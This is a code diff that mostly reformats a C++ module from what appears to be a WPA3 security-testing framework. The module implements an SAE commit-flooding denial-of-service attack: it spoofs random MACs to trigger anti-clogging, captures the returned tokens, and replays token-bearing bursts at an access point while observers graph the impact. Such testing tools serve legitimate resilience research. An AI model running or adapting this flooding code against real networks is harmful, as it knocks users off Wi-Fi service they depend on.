@@ -2,8 +2,8 @@
 
 #include <chrono>
 #include <thread>
-#include <utility>
 #include <tins/tins.h>
+#include <utility>
 
 #include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
 #include "attacks/components/sniffer_helper.h"
@@ -19,49 +19,51 @@ using namespace std;
 using namespace Tins;
 using namespace chrono;
 
-namespace wpa3_tester::pmk_gobbler{
-optional<ACMCookie> parse_acm_response(const vector<uint8_t> &packet){
+namespace wpa3_tester::pmk_gobbler {
+optional<ACMCookie> parse_acm_response(const vector<uint8_t> &packet) {
 	const auto sae = sae_helper::parse_sae_commit(packet);
 	if(!sae || sae->token.empty()) return nullopt;
 
 	const uint16_t radiotap_len = *reinterpret_cast<const uint16_t *>(packet.data() + 2);
 	if(packet.size() < static_cast<size_t>(radiotap_len + 10)) return nullopt;
 
-	return ACMCookie{.sta_mac = HWAddress<6>(packet.data() + radiotap_len + 4), .token = sae->token};
+	return ACMCookie{ .sta_mac = HWAddress<6>(packet.data() + radiotap_len + 4), .token = sae->token };
 }
 
-void capture_cookies(const string &sniff_iface, const HWAddress<6> &ap_mac, CookieStore &store){
+void capture_cookies(const string &sniff_iface, const HWAddress<6> &ap_mac, CookieStore &store) {
 	const string filter = "wlan type mgt subtype auth and wlan addr2 " + ap_mac.to_string();
 
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t *handle = pcap_open_live(sniff_iface.c_str(), 2000, 1, 100, errbuf);
 	if(!handle) throw run_err("pcap_open_live failed: " + string(errbuf));
 	pcap_setnonblock(handle, 1, errbuf);
-	auto guard = unique_ptr<pcap_t, void(*)(pcap_t *)>(handle, pcap_close);
+	auto guard = unique_ptr<pcap_t, void (*)(pcap_t *)>(handle, pcap_close);
 
 	bpf_program fp{};
 	if(pcap_compile(handle, &fp, filter.c_str(), 1, PCAP_NETMASK_UNKNOWN) == 0) pcap_setfilter(handle, &fp);
 	pcap_freecode(&fp);
 
-	components::poll_sniffer<monostate>(handle, nullopt,
-		[&](const uint8_t *packet, const uint32_t caplen) ->optional<monostate>{
-			if(store.stop.load()) return monostate{};
+	components::poll_sniffer<monostate>(
+			handle, nullopt, [&](const uint8_t *packet, const uint32_t caplen) -> optional<monostate> {
+				if(store.stop.load()) return monostate{};
 
-			if(auto entry = parse_acm_response({packet, packet + caplen})){
-				scoped_lock lock(store.mtx);
-				const auto [it, inserted] = store.queue.insert_or_assign(entry->sta_mac, *entry);
-				if(inserted)
-					log(LogLevel::DEBUG, "Cookie captured for {}, queue size {}", entry->sta_mac, store.queue.size());
-			}
-			return nullopt;
-		});
+				if(auto entry = parse_acm_response({ packet, packet + caplen })) {
+					scoped_lock lock(store.mtx);
+					const auto [it, inserted] = store.queue.insert_or_assign(entry->sta_mac, *entry);
+					if(inserted)
+						log(LogLevel::DEBUG,
+								"Cookie captured for {}, queue size {}",
+								entry->sta_mac,
+								store.queue.size());
+				}
+				return nullopt;
+			});
 
 	log(LogLevel::INFO, "Cookie capture stopped");
 }
 
-pair<ACMCookie,int> trigger_acm(const string &iface, const string &att_mac, const HWAddress<6> &ap_mac,
-								const int trigger_count, const sae_helper::SAEPair &sae_params
-){
+pair<ACMCookie, int> trigger_acm(const string &iface, const string &att_mac, const HWAddress<6> &ap_mac,
+		const int trigger_count, const sae_helper::SAEPair &sae_params) {
 	PacketSender sender(iface);
 
 	SnifferConfiguration cfg;
@@ -71,62 +73,59 @@ pair<ACMCookie,int> trigger_acm(const string &iface, const string &att_mac, cons
 
 	log(LogLevel::INFO, "Triggering ACM (max {} frames)...", trigger_count);
 
-	for(int i = 0; i < trigger_count; ++i){
+	for(int i = 0; i < trigger_count; ++i) {
 		auto frame = make_sae_commit(ap_mac, firmware::get_random_ath_masker_mac(att_mac), sae_params);
 		sender.send(frame);
 
-		auto result = components::poll_sniffer<ACMCookie>(sniffer.get_pcap_handle(), milliseconds(5),
-														[&](const uint8_t *packet, const uint32_t caplen
-												) ->optional<ACMCookie>{
-															if(auto cookie = parse_acm_response({
-																packet, packet + caplen
-															})){
-																if(!cookie->token.empty()) return cookie;
-															}
-															return nullopt;
-														});
+		auto result = components::poll_sniffer<ACMCookie>(sniffer.get_pcap_handle(),
+				milliseconds(5),
+				[&](const uint8_t *packet, const uint32_t caplen) -> optional<ACMCookie> {
+					if(auto cookie = parse_acm_response({ packet, packet + caplen })) {
+						if(!cookie->token.empty()) return cookie;
+					}
+					return nullopt;
+				});
 
-		if(holds_alternative<ACMCookie>(result)){
+		if(holds_alternative<ACMCookie>(result)) {
 			log(LogLevel::INFO, "ACM confirmed active after {} frames", i);
-			return {get<ACMCookie>(result), i};
+			return { get<ACMCookie>(result), i };
 		}
 	}
 	throw run_err("ACM not activated after {} frames", trigger_count);
 }
 
 void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddress<6> &ap_mac, CookieStore &store,
-						const int attack_time_sec, const sae_helper::SAEPair &sae_params, const size_t burst_size,
-						const size_t packets_per_second_limit, const int cookie_wait_ms
-){
+		const int attack_time_sec, const sae_helper::SAEPair &sae_params, const size_t burst_size,
+		const size_t packets_per_second_limit, const int cookie_wait_ms) {
 	PacketSender sender(iface);
 	log(LogLevel::INFO, "Burst phase started, duration: {}s", attack_time_sec);
-	dos_helpers::timed_burst(sender, attack_time_sec, burst_size, packets_per_second_limit, [&]() ->optional<RadioTap>{
-		optional<ACMCookie> entry;
-		{
-			scoped_lock lock(store.mtx);
-			if(!store.queue.empty()){
-				const auto it = store.queue.begin();
-				entry = std::move(it->second);
-				store.queue.erase(it);
-			}
-		}
+	dos_helpers::timed_burst(
+			sender, attack_time_sec, burst_size, packets_per_second_limit, [&]() -> optional<RadioTap> {
+				optional<ACMCookie> entry;
+				{
+					scoped_lock lock(store.mtx);
+					if(!store.queue.empty()) {
+						const auto it = store.queue.begin();
+						entry = std::move(it->second);
+						store.queue.erase(it);
+					}
+				}
 
-		if(!entry){
-			this_thread::sleep_for(milliseconds(cookie_wait_ms));
-			auto frame = make_sae_commit(ap_mac, firmware::get_random_ath_masker_mac(sta_mac),
-										sae_params);
-			sender.send(frame);
-			return nullopt;
-		}
+				if(!entry) {
+					this_thread::sleep_for(milliseconds(cookie_wait_ms));
+					auto frame = make_sae_commit(ap_mac, firmware::get_random_ath_masker_mac(sta_mac), sae_params);
+					sender.send(frame);
+					return nullopt;
+				}
 
-		auto burst_params = sae_params;
-		burst_params.token = entry->token;
-		return optional{make_sae_commit(ap_mac, entry->sta_mac, burst_params)};
-	});
+				auto burst_params = sae_params;
+				burst_params.token = entry->token;
+				return optional{ make_sae_commit(ap_mac, entry->sta_mac, burst_params) };
+			});
 	store.stop.store(true); // signal capture thread to exit
 }
 
-void run_attack(RunStatus &rs){
+void run_attack(RunStatus &rs) {
 	const ActorPtr ap = rs.get_actor("ap");
 	const ActorPtr att = rs.get_actor("attacker");
 
@@ -139,7 +138,7 @@ void run_attack(RunStatus &rs){
 
 	//TODO zkotrolovat, že tu je ssid ([předtím bylohardcoded)
 	const optional<sae_helper::SAEPair> sae_params = cookie_guzzler::get_commit_values(
-		rs, att.get(SK::iface), att.get_mon_iface(), ap.get(SK::ssid), ap.get(SK::mac), 30);
+			rs, att.get(SK::iface), att.get_mon_iface(), ap.get(SK::ssid), ap.get(SK::mac), 30);
 	att->set_monitor_mode();
 	att->set_iface_up();
 
@@ -151,19 +150,26 @@ void run_attack(RunStatus &rs){
 	rs.start_observers();
 
 	CookieStore store;
-	thread capture_thread([&](){
-		try{
+	thread capture_thread([&]() {
+		try {
 			capture_cookies(att.get_mon_iface(), ap.get(SK::mac), store);
-		} catch(const exception &e){
+		} catch(const exception &e) {
 			log(LogLevel::ERROR, "Capture thread: {}", e.what());
 			store.stop.store(true);
 		}
 	});
 
-	try{
-		burst_with_cookies(att.get(SK::iface), att.get(SK::mac), ap.get(SK::mac), store, attack_time,
-							sae_params.value(), burst_size, packets_per_sec, cookie_wait_ms);
-	} catch(...){
+	try {
+		burst_with_cookies(att.get(SK::iface),
+				att.get(SK::mac),
+				ap.get(SK::mac),
+				store,
+				attack_time,
+				sae_params.value(),
+				burst_size,
+				packets_per_sec,
+				cookie_wait_ms);
+	} catch(...) {
 		store.stop.store(true);
 		if(capture_thread.joinable()) capture_thread.join();
 		throw;
@@ -174,10 +180,10 @@ void run_attack(RunStatus &rs){
 	ap->conn->disconnect();
 }
 
-void stats_attack(const RunStatus &rs){
+void stats_attack(const RunStatus &rs) {
 	vector<unique_ptr<GraphElements>> elements;
-	rs.log_events(elements, {DISCONNECT, CONNECT, TESTER_TAGS});
-	rs.log_events(elements, {{"client", "@AKM_trigger", "AKM trigger", "black"}});
+	rs.log_events(elements, { DISCONNECT, CONNECT, TESTER_TAGS });
+	rs.log_events(elements, { { "client", "@AKM_trigger", "AKM trigger", "black" } });
 
 	observer::station_counter::create_station_graph(rs, "ap", elements);
 	observer::resource_checker::create_graph(rs, rs.get_actor("ap").get(SK::source), elements);
